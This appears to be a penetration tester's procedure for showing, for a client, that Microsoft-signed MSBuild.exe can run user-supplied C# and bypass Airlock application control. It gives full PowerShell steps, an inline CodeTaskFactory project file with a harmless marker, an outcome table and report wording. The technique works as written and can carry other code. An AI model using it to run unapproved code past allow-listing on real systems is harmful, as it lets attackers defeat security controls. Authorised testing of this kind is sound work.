1. Establish user context and locate MSBuild
whoami

$msbuild32 = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
$msbuild64 = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"

[pscustomobject]@{
    MSBuild32 = Test-Path $msbuild32
    MSBuild64 = Test-Path $msbuild64
}

Take a screenshot showing whoami and both binaries being present.
2. Confirm they are Microsoft-signed
Get-AuthenticodeSignature $msbuild32 |
Select-Object Status,@{N='Signer';E={$_.SignerCertificate.Subject}},Path

Get-AuthenticodeSignature $msbuild64 |
Select-Object Status,@{N='Signer';E={$_.SignerCertificate.Subject}},Path

What you want:
Status : Valid
Signer : ...Microsoft...

This is useful because the finding is specifically about abuse of a trusted Microsoft-signed utility.
3. Create the benign user-controlled MSBuild project
Run:
$project = "$env:TEMP\Ionize-MSBuild-Test.csproj"

@'
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <UsingTask
      TaskName="IonizeTask"
      TaskFactory="CodeTaskFactory"
      AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">

    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class IonizeTask : Task
{
    public override bool Execute()
    {
        Console.WriteLine("Ionize MSBuild application control test");
        Console.WriteLine("User: " + Environment.UserName);
        Console.WriteLine("Machine: " + Environment.MachineName);
        Console.WriteLine("Date: 12 Oct 2026");
        return true;
    }
}
        ]]>
      </Code>
    </Task>

  </UsingTask>

  <Target Name="IonizeTest">
    <IonizeTask />
  </Target>

</Project>
'@ | Set-Content $project -Encoding ASCII

Get-Item $project | Select-Object FullName,Length,LastWriteTime

Then display the interesting part for your evidence:
Get-Content $project

This proves the test file is sitting in a standard-user-writable directory and only contains a harmless console marker.
4. Execute with 64-bit MSBuild
whoami

& $msbuild64 $project /t:IonizeTest /nologo /verbosity:minimal

"Exit code: $LASTEXITCODE"

A confirmed vulnerable result would resemble:
Ionize MSBuild application control test
User: <standard user>
Machine: <hostname>
Date: 12 Oct 2026
Exit code: 0

Take a screenshot containing whoami, the MSBuild command, the Ionize output and exit code.
5. Execute with 32-bit MSBuild
whoami

& $msbuild32 $project /t:IonizeTest /nologo /verbosity:minimal

"Exit code: $LASTEXITCODE"

Again, capture the same evidence.
You don't need both architectures to succeed for the issue to exist. One successful path is sufficient; both succeeding just gives stronger coverage.
6. Capture the Airlock contrast
Now use one of the simple executable/script samples that Airlock definitely blocks and capture the Airlock notification.
For example, your previous EXE/HTA/JS evidence is ideal.
The two screenshots together should communicate:
Direct unapproved execution → Airlock blocks it.

versus:
User-controlled C# supplied to Microsoft-signed MSBuild → code executes.

That contrast is probably the strongest client evidence you can provide.
Also note what Airlock does during the MSBuild run:
- No Airlock notification: record that.
- Audit/warning only but code still executes: still a successful bypass; record that execution was permitted despite detection.
- Explicit block and Ionize marker does not execute: not a successful bypass.
7. Optional second user-writable location
If you want to remove any doubt that %TEMP% is special, copy the exact same project to Downloads:
Copy-Item $project "$env:USERPROFILE\Downloads\Ionize-MSBuild-Test.csproj" -Force

& $msbuild64 "$env:USERPROFILE\Downloads\Ionize-MSBuild-Test.csproj" `
    /t:IonizeTest /nologo /verbosity:minimal

If it executes there too, that's good supporting evidence that this isn't dependent on one unusual path.
Afterwards:
Remove-Item "$env:TEMP\Ionize-MSBuild-Test.csproj" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:USERPROFILE\Downloads\Ionize-MSBuild-Test.csproj" -Force -ErrorAction SilentlyContinue

How I'd interpret the outcomes
Outcome	Conclusion
MSBuild absent	Not applicable for that architecture
Both versions blocked by Airlock before code executes	No MSBuild bypass demonstrated
MSBuild runs but project fails to compile	Inconclusive; troubleshoot before reporting
One version executes the Ionize code	Application-control bypass confirmed
Both versions execute the code	Strong confirmation
Code executes and Airlock produces no block	Strongest result
Code executes but Airlock generates audit/detection	Still a bypass; note that detection exists
Code executes as standard user only	Expected; still supports High application-control finding, but not privilege escalation


If the test succeeds
I’d send the client:
During application-control testing, Ionize identified that a standard user can leverage the Microsoft-signed MSBuild.exe utility to execute user-supplied C# code despite Airlock preventing direct execution of unapproved executable and scripting formats. Testing was performed using a benign project file created within a standard-user-writable directory, which successfully executed and returned an Ionize-controlled test marker in the context of the logged-in user. The behaviour was reproduced using [both the 32-bit and 64-bit versions / the affected version] of MSBuild. This represents an application-control bypass through trusted Microsoft tooling and is currently being assessed as a High-severity finding. No privilege escalation was performed as part of this validation.

If Airlock also didn't alert:
No Airlock block notification was observed during execution.

If Airlock logged/audited it:
Airlock generated an audit/detection event; however, execution was still permitted.

If only one architecture succeeds
Use:
The behaviour was reproduced using the [32-bit/64-bit] .NET Framework version of MSBuild. The alternate version was [blocked/not present/failed to execute the project].

Still a valid finding.
If Airlock blocks it now
Send:
Follow-up testing identified that Airlock prevented execution of user-supplied code through MSBuild. The previously observed behaviour could not be reproduced under the current policy state, and Ionize is validating whether a configuration or policy change occurred during testing.

For the report, the cleanest evidence sequence is Figure 1: Airlock blocks normal executable → Figure 2: benign .csproj content → Figure 3: standard user successfully executes that code through Microsoft-signed MSBuild. That tells the whole story without needing a more aggressive payload.
